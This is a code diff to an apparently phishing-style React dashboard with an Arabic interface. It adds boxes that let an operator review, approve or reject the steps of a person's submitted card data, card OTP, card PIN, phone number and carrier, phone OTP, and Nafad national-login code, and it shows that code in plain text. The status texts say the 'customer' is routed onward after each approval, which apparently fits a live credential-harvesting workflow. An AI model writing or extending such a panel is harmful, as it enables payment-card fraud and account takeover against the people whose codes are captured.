@@ -325,12 +325,18 @@ export default function DashboardPage() {
     return raw?.currentPage || raw?.page || "";
   };
 
+  const getCurrentStep = (): number => {
+    const raw = selectedRequest?.raw;
+    return raw?.currentStep || raw?.step || 0;
+  };
+
   const getPaymentStatus = (): string => {
     const raw = selectedRequest?.raw;
     return raw?._v1Status || "";
   };
 
-  const getOtpStatus = (): string => {
+  // Get card OTP status (step 2 - after payment approval)
+  const getCardOtpStatus = (): string => {
     const raw = selectedRequest?.raw;
     return raw?._v5Status || "";
   };
@@ -340,7 +346,13 @@ export default function DashboardPage() {
     return raw?._v6Status || "";
   };
 
-  // Render card verification status box
+  // Get phone OTP status (step 5 - after PIN)
+  const getPhoneOtpStatus = (): string => {
+    const raw = selectedRequest?.raw;
+    return raw?.phoneOtpStatus || "";
+  };
+
+  // Render card verification status box (_v1Status)
   const renderCardVerificationBox = () => {
     const currentPage = getCurrentPage();
     const paymentStatus = getPaymentStatus();
@@ -353,29 +365,27 @@ export default function DashboardPage() {
 
     return (
       <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
-        <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
-          🔐 صندوق التحقق من البطاقة
-        </h3>
+        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+          <span style={{ fontSize: "1.2rem" }}>💳</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+            صندوق بيانات الدفع
+          </h3>
+        </div>
         
         {/* Status message */}
         {paymentStatus === "approved" && (
           <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم الموافقة على البطاقة</p>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للخطوة التالية</p>
           </div>
         )}
         {paymentStatus === "rejected" && (
           <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ تم رفض البطاقة</p>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال البيانات</p>
           </div>
         )}
-        {paymentStatus === "pending" && currentPage === "check" && (
+        {(paymentStatus === "pending" || paymentStatus === "verifying" || !paymentStatus) && currentPage === "check" && (
           <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار مراجعة البطاقة</p>
-          </div>
-        )}
-        {paymentStatus === "verifying" && currentPage === "check" && (
-          <div style={{ background: "#dbeafe", borderRadius: 8, padding: 12, border: "1px solid #93c5fd", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#1e40af", fontWeight: 600 }}>🔄 جاري التحقق من البطاقة</p>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار المراجعة</p>
           </div>
         )}
         
@@ -410,29 +420,89 @@ export default function DashboardPage() {
     );
   };
 
-  // Render PIN status box
-  const renderPinBox = () => {
-    const pinStatus = getPinStatus();
+  // Render Card OTP box (currentStep === 5)
+  const renderCardOtpBox = () => {
+    const currentStep = getCurrentStep();
+    const cardOtpStatus = getCardOtpStatus();
     const raw = selectedRequest?.raw;
 
-    // Only show this box if PIN data exists
-    if (!raw?._v6 && !raw?.pinCode) {
+    // Only show this box when at step 5 OR if card OTP data exists
+    if (currentStep !== 5 && !raw?._v5 && !raw?.otpCode) {
       return null;
     }
 
     return (
       <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
-        <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
-          🔑 صندوق رمز PIN
-        </h3>
+        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+          <span style={{ fontSize: "1.2rem" }}>🔐</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+            صندوق رمز التحقق من البطاقة
+          </h3>
+          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 2</span>
+        </div>
+        
+        {/* Status message */}
+        {cardOtpStatus === "approved" && (
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للخطوة التالية</p>
+          </div>
+        )}
+        {cardOtpStatus === "rejected" && (
+          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال الرمز</p>
+          </div>
+        )}
+        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && (
+          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار مراجعة الرمز</p>
+          </div>
+        )}
+        
+        {/* Action buttons - show only when at this step */}
+        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && (
+          <div style={{ display: "flex", gap: 8 }}>
+            <button onClick={() => handleOtpAction("approved")} disabled={actionLoading === "otp"}
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
+              ✅ موافق
+            </button>
+            <button onClick={() => handleOtpAction("rejected")} disabled={actionLoading === "otp"}
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700 }}>
+              ❌ مرفوض
+            </button>
+          </div>
+        )}
+      </div>
+    );
+  };
+
+  // Render PIN box (currentStep === 6)
+  const renderPinBox = () => {
+    const currentStep = getCurrentStep();
+    const pinStatus = getPinStatus();
+    const raw = selectedRequest?.raw;
+
+    // Only show this box when at step 6 OR if PIN data exists
+    if (currentStep !== 6 && !raw?._v6 && !raw?.pinCode) {
+      return null;
+    }
+
+    return (
+      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+          <span style={{ fontSize: "1.2rem" }}>🔑</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+            صندوق رمز PIN
+          </h3>
+          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 3</span>
+        </div>
         
         {/* Status message */}
         {pinStatus === "approved" && (
           <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم إدخال رمز PIN</p>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم إدخال رمز PIN - العميل يُوجه للهاتف</p>
           </div>
         )}
-        {pinStatus === "pending" && (
+        {pinStatus === "pending" && currentStep === 6 && (
           <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال رمز PIN</p>
           </div>
@@ -446,52 +516,63 @@ export default function DashboardPage() {
     );
   };
 
-  // Render phone OTP verification box
+  // Render Phone OTP box (currentStep === 7)
   const renderPhoneOtpBox = () => {
-    const otpStatus = getOtpStatus();
+    const currentStep = getCurrentStep();
+    const phoneOtpStatus = getPhoneOtpStatus();
     const raw = selectedRequest?.raw;
-    const currentPage = getCurrentPage();
 
-    // Only show this box if phone data exists
-    if (!raw?.phoneNumber && !raw?._v5 && !raw?.otpCode) {
+    // Only show this box when at step 7 OR if phone OTP data exists
+    if (currentStep !== 7 && !raw?.phoneNumber && !raw?.phoneOtpStatus) {
       return null;
     }
 
     return (
       <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
-        <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
-          📱 صندوق رمز تحقق الهاتف
-        </h3>
+        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+          <span style={{ fontSize: "1.2rem" }}>📱</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+            صندوق رمز تحقق الهاتف
+          </h3>
+          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 4</span>
+        </div>
+        
+        {/* Phone number info */}
+        {raw?.phoneNumber && (
+          <p style={{ margin: "0 0 12px", fontSize: "0.85rem", color: "#6b7280" }}>
+            رقم الهاتف: <strong dir="ltr">{raw.phoneNumber}</strong> - الشركة: {raw.phoneCarrier || "غير محدد"}
+          </p>
+        )}
         
         {/* Status message */}
-        {otpStatus === "approved" && (
+        {phoneOtpStatus === "approved" && (
           <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم الموافقة على رمز الهاتف</p>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للنفاذ</p>
           </div>
         )}
-        {otpStatus === "rejected" && (
+        {phoneOtpStatus === "rejected" && (
           <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ تم رفض رمز الهاتف</p>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد المحاولة</p>
           </div>
         )}
-        {(otpStatus === "pending" || otpStatus === "verifying") && (currentPage === "veri" || currentPage === "step2" || currentPage === "phone" || currentPage === "step5") && (
+        {(phoneOtpStatus === "pending" || phoneOtpStatus === "verifying" || !phoneOtpStatus) && currentStep === 7 && (
           <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار مراجعة رمز الهاتف</p>
           </div>
         )}
         
-        {/* Action buttons - show only when pending or verifying */}
-        {(otpStatus === "pending" || otpStatus === "verifying" || !otpStatus) && (currentPage === "veri" || currentPage === "step2" || currentPage === "phone" || currentPage === "step5") && (
+        {/* Action buttons - show only when at this step */}
+        {(phoneOtpStatus === "pending" || phoneOtpStatus === "verifying" || !phoneOtpStatus) && currentStep === 7 && (
           <div style={{ display: "flex", gap: 8 }}>
-            <button onClick={() => handleOtpAction("approved")} disabled={actionLoading === "otp"}
+            <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
               style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
               ✅ موافق
             </button>
-            <button onClick={() => handleOtpAction("rejected")} disabled={actionLoading === "otp"}
+            <button onClick={() => handlePhoneAction("rejected")} disabled={actionLoading === "phone"}
               style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700 }}>
               ❌ مرفوض
             </button>
-            <button onClick={() => handleOtpAction("resend")} disabled={actionLoading === "otp"}
+            <button onClick={() => handlePhoneAction("resend")} disabled={actionLoading === "phone"}
               style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#f59e0b", color: "#fff", fontWeight: 700 }}>
               🔄 إعادة إرسال
             </button>
@@ -501,14 +582,53 @@ export default function DashboardPage() {
     );
   };
 
+  // Render Nafad box (currentStep === 8)
+  const renderNafadBox = () => {
+    const currentStep = getCurrentStep();
+    const raw = selectedRequest?.raw;
+
+    // Only show this box when at step 8 OR if nafad data exists
+    if (currentStep !== 8 && !raw?.nafadCode) {
+      return null;
+    }
+
+    return (
+      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+          <span style={{ fontSize: "1.2rem" }}>🔐</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+            صندوق رمز النفاذ (Nafad)
+          </h3>
+          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 5</span>
+        </div>
+        
+        {/* Status message */}
+        {raw?.nafadCode && (
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>
+              ✅ تم إرسال رمز النفاذ: {raw.nafadCode}
+            </p>
+          </div>
+        )}
+        {currentStep === 8 && !raw?.nafadCode && (
+          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال رمز النفاذ</p>
+          </div>
+        )}
+      </div>
+    );
+  };
+
   // Render action buttons based on current page
   const renderActionButtons = () => {
-    // Render all three boxes independently (each shows/hides based on data availability)
+    // Render all boxes independently (each shows/hides based on data availability and currentStep)
     return (
       <>
         {renderCardVerificationBox()}
+        {renderCardOtpBox()}
         {renderPinBox()}
         {renderPhoneOtpBox()}
+        {renderNafadBox()}
       </>
     );
   };
